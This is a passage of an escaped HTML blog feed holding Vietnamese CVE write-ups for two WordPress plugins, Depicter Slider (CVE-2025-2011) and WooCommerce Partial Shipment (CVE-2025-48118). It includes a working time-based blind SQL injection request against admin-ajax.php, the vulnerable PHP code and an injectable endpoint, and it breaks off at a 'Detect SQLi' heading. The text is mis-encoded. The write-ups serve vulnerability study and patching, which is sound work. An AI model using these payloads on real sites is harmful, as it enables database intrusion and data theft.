class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;SUBSTRING()&lt;/code&gt; ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;SLEEP(5)&lt;/code&gt; n·∫øu k√Ω t·ª± ƒë√≥ l√† &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng hex encoding &lt;code&gt;w&lt;/code&gt; th√†nh &lt;code&gt;0x77&lt;/code&gt; v√¨ &lt;code&gt;s&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;GET&lt;/strong&gt; request trong n√™n b·ªã escape b·ªüi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress v√† b·ªüi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =&amp;gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-2011&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Depicter Slider&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.6.2&lt;/strong&gt;, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;escape SQL&lt;/strong&gt; khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi &lt;code&gt;&#39;%...%&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Depicter Slider Plugin &amp;lt;= 3.6.1 is vulnerable to SQL Injection &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48118 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/</link>
      <pubDate>Mon, 29 Sep 2025 19:54:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-29-cve-2025-48118/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra tr√™n plugin &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.3&lt;/strong&gt;. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48118&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48118&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wc-partial-shipment/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt;:  v3.2(vul) v√† v3.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Actived WooCommerce plugin&lt;/strong&gt;: plugin b·∫Øt bu·ªôc &lt;strong&gt;actived&lt;/strong&gt; tr∆∞·ªõc khi c√†i &lt;strong&gt;Woocommerce Partial Shipment Plugin&lt;/strong&gt;, m·ªôt s·ªë h√†m trong &lt;strong&gt;WooCommerce&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ &lt;strong&gt;POST&lt;/strong&gt; request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global &lt;code&gt;$wpdb&lt;/code&gt;, ta search t·ª´ kh√≥a n√†y trong file &lt;strong&gt;wc-partial-shipment/woocommerce-partial-shipment.php&lt;/strong&gt; ƒë·ªÉ t√¨m sink.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_sink.png&#34;&#xA;    alt=&#34;search sink&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ t√¨m v·ªã tr√≠ sink trong m√£ ngu·ªìn&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;get_shipment_id&lt;/code&gt; v√† &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; l√† 2 h√†m thu·ªôc class &lt;strong&gt;WXP_Partial_Shipment&lt;/strong&gt; ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/patch.png&#34;&#xA;    alt=&#34;Patch&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;B·∫£n v√° s·ª≠ d·ª•ng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ &lt;strong&gt;n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng&lt;/strong&gt;. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c &lt;strong&gt;escape ƒë√∫ng c√°ch&lt;/strong&gt; tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;get_shipment_id&lt;/code&gt; v√† &lt;code&gt;get_wxp_shipment_data&lt;/code&gt; ƒë·ªÅu ƒë∆∞·ª£c h√†m &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wxp_order_set_shipped(){&#xA;    $order_id = isset($_POST[&amp;#39;order_id&amp;#39;]) ? $_POST[&amp;#39;order_id&amp;#39;] : 0;&#xA;    // other logic&#xA;&#xA;    $wxp_shipment = $this-&amp;gt;get_wxp_shipment_data($order_id);&#xA;    if(isset($_POST[&amp;#39;order_id&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;order_id&amp;#39;]){&#xA;        global $wpdb;&#xA;        $shipment_id = $this-&amp;gt;get_shipment_id($_POST[&amp;#39;order_id&amp;#39;]);&#xA;        if(!$shipment_id){&#xA;            $data = array(&#xA;                &amp;#39;order_id&amp;#39; =&amp;gt;$order_id,&#xA;                &amp;#39;shipment_id&amp;#39; =&amp;gt;1,&#xA;                &amp;#39;shipment_url&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_num&amp;#39;=&amp;gt;&amp;#39;&amp;#39;,&#xA;                &amp;#39;shipment_date&amp;#39;=&amp;gt;current_time(&amp;#39;timestamp&amp;#39;,0),&#xA;            );&#xA;            $wpdb-&amp;gt;insert($wpdb-&amp;gt;prefix.&amp;#34;partial_shipment&amp;#34;,$data,array(&amp;#39;%d&amp;#39;,&amp;#39;%d&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;,&amp;#39;%s&amp;#39;));&#xA;            $shipment_id = $wpdb-&amp;gt;insert_id;&#xA;        }&#xA;    // other logic     &#xA;    }&#xA;&#xA;    echo json_encode(array(&amp;#39;order_id&amp;#39;=&amp;gt;$order_id,&amp;#39;status&amp;#39;=&amp;gt;$status_key));&#xA;    exit();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ &lt;code&gt;order_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;strong&gt;POST request&lt;/strong&gt;, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m &lt;code&gt;get_shipment_id&lt;/code&gt; v√† &lt;code&gt;get_wxp_shipment_data&lt;/code&gt;&#xA;truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ x√°c ƒë·ªãnh n∆°i &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m v·ªã tr√≠ n∆°i h√†m wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;wxp_order_set_shipped&lt;/code&gt; ƒë∆∞·ª£c &lt;code&gt;construct&lt;/code&gt; c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook &lt;code&gt;wp_ajax_wxp_order_set_shipped&lt;/code&gt; =&amp;gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p&lt;/p&gt;&#xA;&lt;p&gt;üëâ Khi truy c·∫≠p v√†o &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi tham s·ªë:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wxp_order_set_shipped&amp;amp;order_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;wxp_order_set_shipped&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;order_id&lt;/code&gt; ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query.&lt;/li&gt;&#xA;&lt;li&gt;Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 